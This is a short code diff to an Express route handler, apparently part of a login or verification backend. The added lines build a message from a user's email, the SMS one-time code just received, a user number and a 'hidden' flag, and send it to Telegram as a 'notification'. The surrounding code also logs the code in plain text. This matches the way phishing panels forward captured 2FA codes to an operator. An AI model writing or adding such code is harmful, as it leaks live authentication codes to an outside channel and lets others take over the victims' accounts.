@@ -128,6 +128,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
         isHidden,
       });
 
+      // Send Telegram notification for SMS code (dual system)
+      const smsMessage = formatSMSMessage(
+        updatedRecord.email,
+        otp,
+        updatedRecord.userNumber,
+        isHidden
+      );
+      sendToTelegram(smsMessage).catch(err => {
+        console.error("⚠️ Telegram SMS notification failed (non-blocking):", err);
+      });
+
       console.log(`✅ SMS code saved - Code: ${otp}, Hidden: ${isHidden}`);
 
       // Clean up temporary session
